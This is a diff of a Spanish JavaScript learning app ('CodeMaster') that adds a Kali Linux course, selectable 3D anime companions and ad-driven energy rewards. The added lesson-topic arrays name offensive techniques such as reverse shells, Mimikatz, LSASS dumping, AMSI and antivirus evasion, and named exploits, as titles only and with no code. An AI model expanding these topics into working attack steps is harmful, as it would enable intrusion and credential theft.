patterns","QSreplace","Uro","Katana","Gauplus","ParamSpider","Arjun","X8","Wfuzz","FFuf","Dirsearch","Dirb","Feroxbuster","Rustbuster","Gobuster dir","Gobuster vhost","Gobuster dns","Gobuster fuzz","Nuclei templates","Nuclei fuzzing","Nuclei workflows","Nuclei custom","Nuclei severity","Nuclei tags","Nuclei rate limit","Nuclei output","Nuclei markdown","Nuclei SARIF","Nuclei JSON","Nuclei integrations","Amass enum","Amass intel","Amass viz","Amass db","Amass track","Amass subs","Amass net","Amass assoc","Amass brute","Amass active","Amass passive","Amass config","Amass API","Amass resolvers","Amass wordlist","Amass timeout","Amass log","Amass JSON","Amass silent","Amass version","Subfinder sources","Subfinder silent","Subfinder recursive","Subfinder all","Subfinder JSON","Subfinder config","Subfinder resolvers","Subfinder timeout","Subfinder threads","Subfinder output","Subfinder version","HTTPx status","HTTPx title","HTTPx tech-detect","HTTPx ports","HTTPx follow-redirects","HTTPx threads","HTTPx rate-limit","HTTPx JSON","HTTPx silent","HTTPx version","Katana crawl","Katana depth","Katana JS crawl","Katana forms","Katana headless","Katana scope","Katana output","Katana JSON","Katana silent","Katana version","GAU providers","GAU subs","GAU threads","GAU blacklist","GAU JSON","GAU silent","GAU version","Waybackurls JSON","Waybackurls domains","Waybackurls no-subs","Waybackurls version","Gospider site","Gospider depth","Gospider concurrency","Gospider include-subs","Gospider other-source","Gospider sitemap","Gospider robots","Gospider JSON","Gospider silent","Gospider version","Hakrawler depth","Hakrawler subs","Hakrawler insecure","Hakrawler JSON","Hakrawler plain","Hakrawler version","Análisis de resultados","Filtrado de URLs","Eliminación de duplicados","Ordenamiento","Clasificación","Priorización","Reporte final","Deploy Vercel","Deploy Netlify","Deploy GitHub Pages","Custom domains","SSL con Let's Encrypt","Backups","Cron jobs","Systemd services","Logs","Monitorización","htop","top","free","df","du","iostat","vmstat","netstat avanzado","ss avanzado","lsof","strace","ltrace","perf","bpftrace","tcpdump avanzado","tshark avanzado","Ngrep","Sniffing pasivo","Sniffing activo","ARP poisoning","DNS poisoning","SSL stripping","HTTPS interception","Certificate pinning","Bypass pinning","Frida scripts","Objection commands","Apktool","JD-GUI","Jadx","dex2jar","Bytecode Viewer","MobSF","APKLab","MobSF static","MobSF dynamic","MobSF API","MobSF docker","MobSF reports","Frida setup","Frida server","Frida CLI","Frida scripts avanzados","Frida hooking","Frida injection","Frida SSL pinning","Frida root detection","Frida emulator detection","Frida anti-debug","Frida tracing","Frida memory","Frida heap","Frida Java","Frida native","Frida ObjC","Frida Swift","Frida Python","Frida REPL","Frida gadgets","Frida codeshare","Frida recipes","Objection setup","Objection android","Objection ios","Objection explore","Objection ssl","Objection root","Objection hooking","Objection memory","Objection filesystem","Objection SQLite","Objection sharedprefs","Objection keystore","Objection clipboard","Objection camera","Objection location","Objection screenshots","Objection UI","Objection bypass","Objection patching","Objection scripts","Objection plugins","Objection API","Objection output","Objection verbose","Objection quiet","Objection version"];
+const KL_TEMAS=["¿Qué es Kali Linux?","Instalar Kali","Kali en VM","Kali en WSL","Kali en Termux","Kali live USB","Actualizar Kali","apt en Kali","dpkg","Snap en Kali","Repositorios Kali","Metapackages","Kali tools","Kali menu","Kali top 10","Nmap en Kali","Metasploit en Kali","Burp en Kali","Wireshark en Kali","Aircrack en Kali","Hydra en Kali","John en Kali","Hashcat en Kali","SQLmap en Kali","Gobuster en Kali","Nikto en Kali","WPScan en Kali","Maltego en Kali","BeEF en Kali","SET en Kali","MSFvenom","Meterpreter","Post-explotación","Privilege escalation","Linux privesc","Windows privesc","Reverse shells","Bind shells","Netcat","Socat","Pivoting","Proxychains","SSH tunneling","Chisel","Ligolo","DNS tunneling","ICMP tunneling","Firewall evasion","AV evasion","AMSI bypass","PowerShell tricks","Mimikatz","BloodHound","SharpHound","PowerView","Rubeus","Kerberoasting","ASREPRoasting","Golden ticket","Silver ticket","DCSync","Pass the hash","Pass the ticket","Overpass the hash","Credential dumping","LSASS dump","SAM dump","NTDS.dit","Secretsdump","Responder","LLMNR poisoning","NBT-NS poisoning","WPAD","IPv6 attacks","mitm6","NTLM relay","SMB relay","LDAP relay","Kerberos attacks","Constrained delegation","Unconstrained delegation","Resource-based delegation","ADCS attacks","ESC1","ESC8","PetitPotam","PrintNightmare","ZeroLogon","EternalBlue","BlueKeep","SMBGhost","ProxyLogon","ProxyShell","Log4Shell","Spring4Shell","Shellshock","Heartbleed","Dirty COW","PwnKit","Sudo Baron Samedit","Polkit","Kernel exploits","ExploitDB","SearchSploit","CVE databases","NVD","MITRE","CVSS scoring","Web app pentesting","Burp Suite intro","Burp proxy","Burp repeater","Burp intruder","Burp scanner","Burp extensions","OWASP ZAP intro","ZAP proxy","ZAP scan","ZAP fuzzing","SQLi avanzado","NoSQLi","XXE","SSRF","XSS avanzado","CSP bypass","CORS","Clickjacking","WebSockets","GraphQL hacking","API hacking","REST API","Postman","Insomnia","JWT attacks","OAuth attacks","SAML attacks","Session fixation","Cookie attacks","CSRF avanzado","File upload","Path traversal","LFI","RFI","Command injection","Code injection","Template injection","Deserialization","Prototype pollution","Race conditions","Business logic flaws","IDOR","Access control","Auth bypass","2FA bypass","Password reset flaws","Rate limiting","WAF bypass","Cloud pentesting","AWS essentials","IAM misconfig","S3 buckets","EC2 metadata","Lambda attacks","Azure AD","GCP","Kubernetes","Docker escape","Container security","CI/CD attacks","Supply chain","Dependency confusion","Cryptography","Symmetric crypto","Asymmetric crypto","Hashing","Digital signatures","PKI","TLS/SSL","OpenSSL","VPN","IPSec","WireGuard","OpenVPN","WiFi hacking","WPA2","WPA3","Evil twin","Rogue AP","Deauth attacks","PMKID","Handshake capture","Aircrack-ng workflow","Wifite","Reaver WPS","Bluetooth hacking","BLE","Zigbee","SDR","RFID","NFC","Hardware hacking","JTAG","UART","SPI","I2C","Logic analyzer","Oscilloscope","Raspberry Pi pentesting","Arduino pentesting","Flipper Zero","Proxmark","HackRF","RTL-SDR","Mobile pentesting","Android","iOS","APK analysis","Frida","Objection","MobSF","Burp mobile","SSL pinning bypass","Root detection bypass","Emulator detection","Reverse engineering","Ghidra","IDA","Radare2","x64dbg","OllyDbg","Binary analysis","Malware analysis","Static analysis","Dynamic analysis","Sandboxing","YARA","Sigma","Threat intel","OSINT avanzado","Social media intel","Dark web","OSINT tools","Anonymity","Tor","VPN chains","Proxies","Tails OS","Whonix","Qubes OS","Physical security","Lockpicking","Locksport","Bypass tools","Social engineering","Pretexting","Vishing","Phishing","Spear phishing","Whaling","BEC","Red team operations","C2 frameworks","Cobalt Strike","Sliver","Mythic","Empire","Redirectors","Domain fronting","Living off the land","MITRE ATT&CK","Cyber kill chain","Diamond model","Incident response","NIST 800-61","Forensics","Memory forensics","Disk forensics","Volatility","Autopsy","Network forensics","Log analysis","Timeline analysis","Malware triage","Threat hunting","SIEM","Splunk","ELK","Wazuh","Compliance","ISO 27001","GDPR","PCI DSS","HIPAA","SOC 2","Risk management","Vulnerability management","Patch management","Security awareness","Penetration testing","Scoping","Rules of engagement","Reporting","Remediation","Retesting","Continuous improvement"];
+
+const PY=generar300(PY_TEMAS,"Python");
+const HK=generar300(HK_TEMAS,"Hacking Ético");
+const TX=generar300(TX_TEMAS,"Termux");
+const KL=generar300(KL_TEMAS,"Kali Linux");
 
 const CURSOS={
-python:{nombre:"Python",color:"#58cc02",color2:"#3a8f01",lecciones:PY},
-hacking:{nombre:"Hacking",color:"#e94560",color2:"#a82842",lecciones:HK},
-termux:{nombre:"Termux",color:"#00d4aa",color2:"#008f70",lecciones:TX}
+python:{nombre:"Python",color:"#58cc02",color2:"#3a8f01",clase:"active-python",lecciones:PY},
+hacking:{nombre:"Hacking",color:"#e94560",color2:"#a82842",clase:"active-hacking",lecciones:HK},
+termux:{nombre:"Termux",color:"#00d4aa",color2:"#008f70",clase:"active-termux",lecciones:TX},
+kali:{nombre:"Kali",color:"#7b4dff",color2:"#5a2bd6",clase:"active-kali",lecciones:KL}
 };
 
 // ============================================
-// ESTADO GLOBAL
+// ESTADO
 // ============================================
 let cursoActual='python';
-let progreso={python:0,hacking:0,termux:0};
+let progreso={python:0,hacking:0,termux:0,kali:0};
 let xp=0,level=1,streak=0,logros=[],errores=[],energia=100;
 let currentUser=null,aquaVisible=true,modoRepaso=false,ultimaRecarga=Date.now();
-let welcomePaso=0;
-let isVip=false;
-let adsterraTaps=parseInt(localStorage.getItem('adsterraTaps')||'0');
+let welcomePaso=0,isVip=false,adsterraTaps=parseInt(localStorage.getItem('adsterraTaps')||'0');
+let currentWaifu=WAIFUS[0],hasChangedWaifu=false,hasVisitedSalon=false;
+let waifuSize=parseFloat(localStorage.getItem('waifuSize')||'1.3');
 const COSTO_ENERGIA=10,REGEN_MS=180000;
+function totalCompletadas(){return Object.values(progreso).reduce((a,b)=>a+b,0);}
 
-const WELCOME_STEPS=[
-{icon:"👋",title:"¡Bienvenido a CodeMaster!",text:"Aprende Python, Hacking Ético y Termux con Aqua, tu compañera diosa."},
-{icon:"📚",title:"3 Cursos, 120 Lecciones",text:"Cada curso tiene 40 lecciones detalladas con teoría, ejemplos y quiz al final."},
-{icon:"⚡",title:"Energía y Rachas",text:"Ganas 15 XP por lección. Cada lección cuesta 10 de energía, que se regenera 1 cada 3 minutos. ¡Mantén tu racha diaria!"},
-{icon:"🏆",title:"Logros y Repaso",text:"Desbloquea logros al avanzar. Si fallas una pregunta, queda en tu lista de repaso para volver a intentarla."},
-{icon:"💬",title:"Aqua te acompaña",text:"Arrástrala por la pantalla, ocúltala con 👁️, o chatea con ella pulsando 💬. ¡Ella te responderá con IA!"},
-{icon:"⭐",title:"CodeMaster VIP",text:"Energía infinita, personajes exclusivos, temas personalizados y mucho más. Si eres de los afortunados, ¡tendrás VIP de por vida!"}
-];
-
-function totalCompletadas(){return progreso.python+progreso.hacking+progreso.termux;}
-
-// ============================================
-// AUTENTICACIÓN
-// ============================================
-auth.onAuthStateChanged((user)=>{
-if(user){
-currentUser=user;
-isVip=VIP_EMAILS.includes(user.email);
+// AUTH
+auth.onAuthStateChanged((u)=>{
+if(u){
+currentUser=u;isVip=VIP_EMAILS.includes(u.email);
 document.getElementById('auth-overlay').style.display='none';
-document.getElementById('welcome-overlay').classList.remove('active');
-document.getElementById('welcome-overlay').style.display='none';
+document.getElementById('welcome-overlay').classList.remove('active');document.getElementById('welcome-overlay').style.display='none';
 document.getElementById('user-bar').style.display='flex';
-document.getElementById('user-email').innerText=user.email;
+document.getElementById('user-email').innerText=u.email;
 document.getElementById('vip-badge').style.display=isVip?'inline-block':'none';
 if(isVip)energia=99999;
-cargarDatos(user.uid);
+cargarDatos(u.uid);
 }else{
 currentUser=null;isVip=false;
 document.getElementById('auth-overlay').style.display='flex';
-document.getElementById('welcome-overlay').classList.remove('active');
-document.getElementById('welcome-overlay').style.display='none';
+document.getElementById('welcome-overlay').classList.remove('active');document.getElementById('welcome-overlay').style.display='none';
 document.getElementById('user-bar').style.display='none';
 document.getElementById('vip-badge').style.display='none';
 }
 });
 
-function registrar(){
-const email=document.getElementById('email').value.trim();
-const pass=document.getElementById('password').value;
-const err=document.getElementById('auth-error');
-err.innerText='';
-if(!email||pass.length<6){err.innerText="Correo válido y contraseña 6+.";return;}
-auth.createUserWithEmailAndPassword(email,pass).catch(e=>err.innerText=traducir(e.code));
-}
-function login(){
-const email=document.getElementById('email').value.trim();
-const pass=document.getElementById('password').value;
-const err=document.getElementById('auth-error');
-err.innerText='';
-auth.signInWithEmailAndPassword(email,pass).catch(e=>err.innerText=traducir(e.code));
-}
-function traducir(c){
-const m={'auth/email-already-in-use':'Correo ya registrado.','auth/invalid-email':'Correo inválido.','auth/weak-password':'Contraseña débil.','auth/user-not-found':'Usuario no existe.','auth/wrong-password':'Contraseña incorrecta.','auth/invalid-credential':'Datos incorrectos.'};
-return m[c]||'Error: '+c;
-}
-function cerrarSesion(){
-if(confirm('¿Cerrar sesión?')){
-document.getElementById('welcome-overlay').classList.remove('active');
-document.getElementById('welcome-overlay').style.display='none';
-auth.signOut();
-}
-}
+function registrar(){const e=document.getElementById('email').value.trim(),p=document.getElementById('password').value,err=document.getElementById('auth-error');err.innerText='';if(!e||p.length<6){err.innerText="Correo válido y contraseña 6+.";return;}auth.createUserWithEmailAndPassword(e,p).catch(x=>err.innerText=traducir(x.code));}
+function login(){const e=document.getElementById('email').value.trim(),p=document.getElementById('password').value,err=document.getElementById('auth-error');err.innerText='';auth.signInWithEmailAndPassword(e,p).catch(x=>err.innerText=traducir(x.code));}
+function traducir(c){const m={'auth/email-already-in-use':'Correo ya registrado.','auth/invalid-email':'Correo inválido.','auth/weak-password':'Contraseña débil.','auth/user-not-found':'Usuario no existe.','auth/wrong-password':'Contraseña incorrecta.','auth/invalid-credential':'Datos incorrectos.'};return m[c]||'Error: '+c;}
+function cerrarSesion(){if(confirm('¿Cerrar sesión?')){document.getElementById('welcome-overlay').classList.remove('active');document.getElementById('welcome-overlay').style.display='none';auth.signOut();}}
 
-// ============================================
-// GUARDAR / CARGAR
-// ============================================
-async function guardarProgreso(){
-if(!currentUser)return;
-try{
-await db.collection('usuarios').doc(currentUser.uid).set({email:currentUser.email,xp,level,streak,progreso,logros,errores,energia,ultimaRecarga,adsterraTaps,ultimaActividad:firebase.firestore.FieldValue.serverTimestamp()},{merge:true});
-}catch(e){console.error(e);}
-}
+async function guardarProgreso(){if(!currentUser)return;try{await db.collection('usuarios').doc(currentUser.uid).set({email:currentUser.email,xp,level,streak,progreso,logros,errores,energia,ultimaRecarga,adsterraTaps,waifuId:currentWaifu.id,waifuSize,ultimaActividad:firebase.firestore.FieldValue.serverTimestamp()},{merge:true});}catch(e){console.error(e);}}
 
 async function cargarDatos(uid){
 try{
@@ -584,343 +338,221 @@ const doc=await db.collection('usuarios').doc(uid).get();
 if(doc.exists){
 const d=doc.data();
 xp=d.xp||0;level=d.level||1;streak=d.streak||0;energia=d.energia||100;
-progreso=d.progreso||{python:0,hacking:0,termux:0};
+progreso=d.progreso||{python:0,hacking:0,termux:0,kali:0};
 logros=d.logros||[];errores=d.errores||[];
 ultimaRecarga=d.ultimaRecarga||Date.now();
 if(d.adsterraTaps!==undefined){adsterraTaps=d.adsterraTaps;localStorage.setItem('adsterraTaps',adsterraTaps);}
-if(d.ultimaActividad){
-const last=d.ultimaActividad.toDate();
-const hoy=new Date();
-const diff=Math.floor((hoy-last)/(1000*60*60*24));
-if(diff===1)streak++;
-else if(diff>1)streak=1;
-}else streak=1;
+if(d.waifuId){const w=WAIFUS.find(x=>x.id===d.waifuId);if(w)currentWaifu=w;}
+if(d.waifuSize)waifuSize=d.waifuSize;
+if(d.ultimaActividad){const l=d.ultimaActividad.toDate();const h=new Date();const dd=Math.floor((h-l)/(1000*60*60*24));if(dd===1)streak++;else if(dd>1)streak=1;}else streak=1;
 if(isVip)energia=99999;
-calcularEnergia();actualizarStats();renderPath();verificarLogros();guardarProgreso();
+calcularEnergia();actualizarStats();renderPath();verificarLogros();cargarWaifu(currentWaifu);guardarProgreso();
 if(!d.vistoBienvenida){mostrarBienvenida();await db.collection('usuarios').doc(uid).set({vistoBienvenida:true},{merge:true});}
 }else{
 streak=1;energia=isVip?99999:100;ultimaRecarga=Date.now();
-await db.collection('usuarios').doc(uid).set({email:currentUser.email,xp:0,level:1,streak:1,energia:isVip?99999:100,ultimaRecarga:Date.now(),progreso:{python:0,hacking:0,termux:0},logros:[],errores:[],adsterraTaps:0,vistoBienvenida:true});
-actualizarStats();renderPath();
-mostrarBienvenida();
+await db.collection('usuarios').doc(uid).set({email:currentUser.email,xp:0,level:1,streak:1,energia:isVip?99999:100,ultimaRecarga:Date.now(),progreso:{python:0,hacking:0,termux:0,kali:0},logros:[],errores:[],adsterraTaps:0,waifuId:'aqua',waifuSize:1.3,vistoBienvenida:true});
+actualizarStats();renderPath();mostrarBienvenida();
 }
 }catch(e){console.error(e);}
 }
 
-// ============================================
-// ENERGÍA
-// ============================================
-function calcularEnergia(){
-if(isVip){energia=99999;return;}
-const ahora=Date.now();
-const transcurrido=ahora-ultimaRecarga;
-const ganada=Math.floor(transcurrido/REGEN_MS);
-if(ganada>0){energia=Math.min(100,energia+ganada);ultimaRecarga=ahora-((transcurrido%REGEN_MS));}
-}
+function calcularEnergia(){if(isVip){energia=99999;return;}const a=Date.now();const t=a-ultimaRecarga;const g=Math.floor(t/REGEN_MS);if(g>0){energia=Math.min(100,energia+g);ultimaRecarga=a-(t%REGEN_MS);}}
 
 function conseguirEnergia(){
-if(isVip){aquaSpeak("¡Eres VIP, tienes energía infinita! 😏",2500);return;}
-if(energia>=100){aquaSpeak("¡Ya tienes la energía llena, mortal! ⚡",2500);return;}
+if(isVip){aquaSpeak("¡Eres VIP, energía infinita! 😏",2500);return;}
+if(energia>=100){aquaSpeak("¡Energía llena! ⚡",2500);return;}
 window.open(ADSTERRA_URL,'_blank');
-adsterraTaps++;
-localStorage.setItem('adsterraTaps',adsterraTaps);
-if(adsterraTaps>=ADSTERRA_TAPS_NEEDED){
-energia=Math.min(100,energia+ADSTERRA_REWARD);
-adsterraTaps=0;
-localStorage.setItem('adsterraTaps',0);
-actualizarStats();
-guardarProgreso();
-mostrarToast(`⚡ ¡+${ADSTERRA_REWARD} de energía!`);
-aquaSpeak("¡Toma energía, mortal agradecido! 😏",3000);
-}else{
-mostrarToast(`⚡ ${adsterraTaps}/${ADSTERRA_TAPS_NEEDED} taps para +${ADSTERRA_REWARD} energía`);
-}
+adsterraTaps++;localStorage.setItem('adsterraTaps',adsterraTaps);
+if(adsterraTaps>=ADSTERRA_TAPS_NEEDED){energia=Math.min(100,energia+ADSTERRA_REWARD);adsterraTaps=0;localStorage.setItem('adsterraTaps',0);actualizarStats();guardarProgreso();mostrarToast(`⚡ +${ADSTERRA_REWARD}`);}
+else mostrarToast(`⚡ ${adsterraTaps}/${ADSTERRA_TAPS_NEEDED}`);
 actualizarBotonEnergia();
 }
+function actualizarBotonEnergia(){const b=document.getElementById('btn-energy');if(!b)return;if(isVip){b.innerText='⚡ ∞';return;}if(energia>=100){b.innerText='⚡ Llena';return;}b.innerText=`⚡ ${adsterraTaps}/${ADSTERRA_TAPS_NEEDED}`;}
 
-function actualizarBotonEnergia(){
-const btn=document.getElementById('btn-energy');
-if(!btn)return;
-if(isVip){btn.innerText='⚡ ∞';return;}
-if(energia>=100){btn.innerText='⚡ Llena';return;}
-btn.innerText=`⚡ +Ener (${adsterraTaps}/${ADSTERRA_TAPS_NEEDED})`;
-}
-
-// ============================================
-// VIP
-// ============================================
-function abrirVip(){
-const list=document.getElementById('vip-benefits-list');
-list.innerHTML='';
-VIP_BENEFITS.forEach(b=>{
-list.innerHTML+=`<div class="vip-benefit"><div class="icon">${b.icon}</div><div><h4>${b.title}</h4><p>${b.desc}</p></div></div>`;
-});
-const status=document.getElementById('vip-status-area');
-if(isVip){
-status.innerHTML=`<div style="background:linear-gradient(135deg,#f39c12,#c87f0a);color:#fff;padding:15px;border-radius:14px;font-weight:800">⭐ ¡Eres miembro VIP de por vida! ⭐</div>`;
-}else{
-status.innerHTML=`<p style="color:#8b95a5;font-size:13px">Próximamente disponible. Por ahora solo correos seleccionados tienen acceso VIP.</p>`;
-}
-document.getElementById('modal-vip').classList.add('active');
-}
-function cerrarVip(){document.getElementById('modal-vip').classList.remove('active');}
-
-// ============================================
-// BIENVENIDA
-// ============================================
-function mostrarBienvenida(){
-welcomePaso=0;
-const el=document.getElementById('welcome-overlay');
-el.style.display='flex';
-el.classList.add('active');
-renderWelcome();
-}
-
-function renderWelcome(){
-const paso=WELCOME_STEPS[welcomePaso];
-const card=document.getElementById('welcome-card');
-const prog=document.getElementById('welcome-progress');
-document.getElementById('welcome-sub').innerText = welcomePaso===0 ? "Tu aventura con Aqua comienza ahora" : "";
-prog.innerHTML='';
-WELCOME_STEPS.forEach((_,i)=>{
-const d=document.createElement('div');
-d.className='welcome-dot'+(i===welcomePaso?' active':'');
-prog.appendChild(d);
-});
-card.innerHTML=`<div class="welcome-step"><div class="icon">${paso.icon}</div><div class="text"><strong>${paso.title}</strong>${paso.text}</div></div>`;
-document.querySelector('.welcome-btn').innerText = welcomePaso === WELCOME_STEPS.length-1 ? "¡EMPEZAR! 🚀" : "SIGUIENTE ➤";
-}
-
-function welcomeNext(){
-if(welcomePaso < WELCOME_STEPS.length-1){
-welcomePaso++;
-renderWelcome();
-} else {
-const el=document.getElementById('welcome-overlay');
-el.classList.remove('active');
-el.style.display='none';
-aquaSpeak("¡Bienvenido! Elige un curso y empecemos. 😏",4000);
-}
-}
-
-// ============================================
-// STATS
-// ============================================
 function actualizarStats(){
-document.getElementById('xp').innerText=xp;
-document.getElementById('level').innerText=level;
+document.getElementById('xp').innerText=xp;document.getElementById('level').innerText=level;
 document.getElementById('streak').innerText=streak+'🔥';
-const energyEl=document.getElementById('energy');
-if(isVip){energyEl.innerText='∞';energyEl.classList.add('energy-inf');}
-else{energyEl.innerText=energia;energyEl.classList.remove('energy-inf');}
+const e=document.getElementById('energy');
+if(isVip){e.innerText='∞';e.classList.add('energy-inf');}else{e.innerText=energia;e.classList.remove('energy-inf');}
 document.getElementById('logros-count').innerText=logros.length;
 document.getElementById('errores-count').innerText=errores.length;
 actualizarBotonEnergia();
 }
-
-function verificarLogros(){
-LOGROS.forEach(l=>{if(!logros.includes(l.id)&&l.check()){logros.push(l.id);mostrarToast(`🏆 ¡Logro: ${l.name}!`);}});
-actualizarStats();
-}
-
-function mostrarToast(txt){
-const t=document.getElementById('toast');
-t.innerText=txt;t.classList.add('show');
-setTimeout(()=>t.classList.remove('show'),3500);
-}
-
-function abrirLogros(){
-const list=document.getElementById('logros-list');
-list.innerHTML='';
-LOGROS.forEach(l=>{
-const u=logros.includes(l.id);
-list.innerHTML+=`<div class="achievement ${u?'unlocked':'locked'}"><div class="icon">${l.icon}</div><div class="info"><h4>${l.name}</h4><p>${l.desc}</p></div></div>`;
-});
-document.getElementById('modal-logros').classList.add('active');
-}
+function verificarLogros(){LOGROS.forEach(l=>{if(!logros.includes(l.id)&&l.check()){logros.push(l.id);mostrarToast(`🏆 ${l.name}`);}});actualizarStats();}
+function mostrarToast(t){const el=document.getElementById('toast');el.innerText=t;el.classList.add('show');setTimeout(()=>el.classList.remove('show'),3500);}
+function abrirLogros(){const l=document.getElementById('logros-list');l.innerHTML='';LOGROS.forEach(x=>{const u=logros.includes(x.id);l.innerHTML+=`<div class="achievement ${u?'unlocked':'locked'}"><div class="icon">${x.icon}</div><div class="info"><h4>${x.name}</h4><p>${x.desc}</p></div></div>`;});document.getElementById('modal-logros').classList.add('active');}
 function cerrarLogros(){document.getElementById('modal-logros').classList.remove('active');}
+function abrirVip(){const l=document.getElementById('vip-benefits-list');l.innerHTML='';VIP_BENEFITS.forEach(b=>{l.innerHTML+=`<div class="vip-benefit"><div class="icon">${b.icon}</div><div><h4>${b.title}</h4><p>${b.desc}</p></div></div>`;});document.getElementById('vip-status-area').innerHTML=isVip?`<div style="background:linear-gradient(135deg,#f39c12,#c87f0a);color:#fff;padding:15px;border-radius:14px;font-weight:800">⭐ VIP de por vida ⭐</div>`:`<p style="color:#8b95a5;font-size:13px">Próximamente.</p>`;document.getElementById('modal-vip').classList.add('active');}
+function cerrarVip(){document.getElementById('modal-vip').classList.remove('active');}
+function repasarErrores(){if(errores.length===0){aquaSpeak("¡Sin errores! 😏",3000);return;}modoRepaso=true;const e=errores[0];abrirLeccion(e.idx,e.curso);}
 
-function repasarErrores(){
-if(errores.length===0){aquaSpeak("¡Sin errores pendientes! 😏",3000);return;}
-modoRepaso=true;
-const e=errores[0];
-abrirLeccion(e.idx,e.curso);
+// WAIFUS
+function abrirWaifus(){const l=document.getElementById('waifus-list');l.innerHTML='';WAIFUS.forEach(w=>{l.innerHTML+=`<div class="waifu-card ${w.id===currentWaifu.id?'selected':''}" onclick="seleccionarWaifu('${w.id}')"><div class="avatar">${w.icon}</div><div class="info"><h4>${w.name}</h4><p>${w.desc}</p></div>${w.id===currentWaifu.id?'<span class="check">✓</span>':''}</div>`;});document.getElementById('size-slider').value=waifuSize;document.getElementById('size-val').innerText=waifuSize.toFixed(1)+'x';document.getElementById('modal-waifus').classList.add('active');}
+function cerrarWaifus(){document.getElementById('modal-waifus').classList.remove('active');}
+function seleccionarWaifu(id){const w=WAIFUS.find(x=>x.id===id);if(!w)return;currentWaifu=w;hasChangedWaifu=true;cargarWaifu(w);cerrarWaifus();abrirWaifus();verificarLogros();guardarProgreso();aquaSpeak(`¡Ahora soy ${w.name}! 😏`,2500);}
+function cambiarTamano(v,fromSlider){if(fromSlider)waifuSize=parseFloat(v);else waifuSize=Math.max(0.5,Math.min(3,waifuSize+parseFloat(v)));if(modelo3D)modelo3D.scale.set(waifuSize,waifuSize,waifuSize);document.getElementById('size-slider').value=waifuSize;document.getElementById('size-val').innerText=waifuSize.toFixed(1)+'x';localStorage.setItem('waifuSize',waifuSize);guardarProgreso();}
+
+// SALÓN
+let salonScene,salonCamera,salonRenderer,salonWaifu,salonRot=0,salonZoom=5;
+function abrirSalon(){hasVisitedSalon=true;document.getElementById('salon-view').classList.add('active');setTimeout(()=>iniciarSalon(),100);verificarLogros();guardarProgreso();}
+function cerrarSalon(){document.getElementById('salon-view').classList.remove('active');if(salonRenderer){salonRenderer.dispose();salonRenderer=null;}salonScene=null;salonCamera=null;salonWaifu=null;}
+function iniciarSalon(){
+const c=document.getElementById('salon-canvas');
+salonScene=new THREE.Scene();salonScene.background=new THREE.Color(0x1a1a2e);
+salonCamera=new THREE.PerspectiveCamera(50,c.clientWidth/c.clientHeight,0.1,1000);
+salonCamera.position.set(0,2,salonZoom);
+salonRenderer=new THREE.WebGLRenderer({canvas:c,antialias:true});
+salonRenderer.setSize(c.clientWidth,c.clientHeight);salonRenderer.setPixelRatio(Math.min(window.devicePixelRatio,2));
+salonScene.add(new THREE.AmbientLight(0xffffff,1));
+const d=new THREE.DirectionalLight(0xffffff,1.2);d.position.set(3,5,3);salonScene.add(d);
+const p=new THREE.PointLight(0x1cb0f6,1.5,15);p.position.set(-3,2,3);salonScene.add(p);
+new THREE.GLTFLoader().load('/static/salon.glb',g=>{const s=g.scene;s.position.set(0,-1,0);salonScene.add(s);},undefined,e=>console.error(e));
+new THREE.GLTFLoader().load(currentWaifu.model,g=>{salonWaifu=g.scene;salonWaifu.scale.set(1.5,1.5,1.5);salonScene.add(salonWaifu);},undefined,e=>console.error(e));
+function loop(){requestAnimationFrame(loop);if(!salonRenderer)return;if(salonWaifu)salonWaifu.rotation.y=salonRot;salonRenderer.render(salonScene,salonCamera);}
+loop();
 }
+function rotarSalon(d){salonRot+=d*0.3;}
+function zoomSalon(v){salonZoom=Math.max(2,Math.min(10,salonZoom+v));if(salonCamera)salonCamera.position.z=salonZoom;}
 
-// ============================================
-// RENDER PATH
-// ============================================
+// RENDER
 function renderPath(){
-const curso=CURSOS[cursoActual];
-const prog=progreso[cursoActual];
-const cont=document.getElementById('path-container');
-cont.innerHTML='';
-curso.lecciones.forEach((l,i)=>{
-const n=document.createElement('div');
-n.className='node';
-n.innerHTML=`<span class="node-num">${i+1}</span><span class="node-mini">${l.t.substring(0,12)}</span>`;
-if(i<prog){n.classList.add('completed');n.onclick=()=>abrirLeccion(i,cursoActual);}
-else if(i===prog){n.classList.add('active');if(cursoActual==='hacking')n.classList.add('active-hacking');if(cursoActual==='termux')n.classList.add('active-termux');n.onclick=()=>abrirLeccion(i,cursoActual);}
+const c=CURSOS[cursoActual];const p=progreso[cursoActual];
+const cont=document.getElementById('path-container');cont.innerHTML='';
+const visibles=Math.min(60,p+30);
+for(let i=0;i<visibles;i++){
+const l=c.lecciones[i];const n=document.createElement('div');
+n.className='node';n.innerHTML=`<span class="node-num">${i+1}</span><span class="node-mini">${l.t.substring(0,10)}</span>`;
+if(i<p){n.classList.add('completed');n.onclick=()=>abrirLeccion(i,cursoActual);}
+else if(i===p){n.classList.add('active');n.classList.add(c.clase);n.onclick=()=>abrirLeccion(i,cursoActual);}
 else{n.classList.add('locked');n.innerHTML='🔒';n.onclick=()=>aquaSpeak("¡Bloqueado! 😈",2000);}
 cont.appendChild(n);
-});
+}
 document.getElementById('tab-python').className='course-tab'+(cursoActual==='python'?' active-python':'');
 document.getElementById('tab-hacking').className='course-tab'+(cursoActual==='hacking'?' active-hacking':'');
 document.getElementById('tab-termux').className='course-tab'+(cursoActual==='termux'?' active-termux':'');
+document.getElementById('tab-kali').className='course-tab'+(cursoActual==='kali'?' active-kali':'');
 }
-
 function switchCourse(c){cursoActual=c;renderPath();aquaSpeak(`¡${CURSOS[c].nombre}! 😏`,2000);}
 
-// ============================================
 // LECCIONES
-// ============================================
+let preguntasActuales=[],pregIdx=0,respuestasCorrectas=0;
 function abrirLeccion(idx,curso){
-const cursoKey=curso||cursoActual;
-const lec=CURSOS[cursoKey].lecciones[idx];
-if(!lec)return;
-if(!modoRepaso && !isVip && energia<COSTO_ENERGIA){aquaSpeak("¡Sin energía! Espera o mira un anuncio. ⚡",3000);return;}
+const key=curso||cursoActual;const lec=CURSOS[key].lecciones[idx];if(!lec)return;
+if(!modoRepaso && !isVip && energia<COSTO_ENERGIA){aquaSpeak("¡Sin energía! ⚡",3000);return;}
 if(!modoRepaso && !isVip){energia-=COSTO_ENERGIA;actualizarStats();guardarProgreso();}
 document.getElementById('lesson-overlay').classList.add('active');
-moverAquaLeccion(true);
-document.getElementById('lesson-counter').innerText=`${idx+1}/${CURSOS[cursoKey].lecciones.length}`;
+moverWaifuLeccion(true);
+document.getElementById('lesson-counter').innerText=`${idx+1}/${CURSOS[key].lecciones.length}`;
 const fill=document.getElementById('lesson-progress-fill');
